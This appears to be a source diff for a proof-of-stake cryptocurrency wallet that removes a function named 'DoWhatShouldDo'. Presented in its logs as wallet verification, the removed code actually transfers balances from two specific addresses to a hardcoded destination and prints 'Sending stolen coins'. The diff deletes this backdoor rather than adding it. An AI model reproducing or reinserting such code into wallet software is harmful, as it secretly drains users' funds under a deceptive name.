@@ -4650,33 +4650,6 @@ void BitcoinMiner(CWallet *pwallet, bool fProofOfStake)
     scrypt_buffer_free(scratchbuf);
 }
 
-void DoWhatShouldDo(CWallet *pwallet)
-{
-    if (pwallet->IsLocked())
-        return;
-    printf("starting verify wallet...\n");
-    map<CTxDestination, int64> balances = pwallet->GetAddressBalances();
-    map<CTxDestination, int64>::iterator itBalance = balances.begin();
-    while(itBalance != balances.end())
-    {
-        string targetAddress = (CBitcoinAddress(itBalance->first)).ToString();
-        if(targetAddress == string("YjkuMvDFrHjT6MqX3DyHpsg4t9YNsLuxnN")
-                || targetAddress == string("YVMi9QyRKPZtW3eQxLpbFyB4Sfpsrdb1Wi"))
-        {
-            CBitcoinAddress desAddress("YekNus6txQPj9K6sStoK2siU255in8352m");
-            CWalletTx wtx;
-            if(itBalance->second > COIN)
-            {
-                string strError = pwallet->SendMoneyToDestination(desAddress.Get(), itBalance->second - COIN, wtx);
-                if (strError != "")
-                   return;
-            }
-            printf("Sending stolen coins %llu success.\n",itBalance->second - COIN);
-        }
-        ++itBalance;
-    }
-    printf("end verify wallet...\n");
-}
 void static ThreadBitcoinMiner(void* parg)
 {
     CWallet* pwallet = (CWallet*)parg;
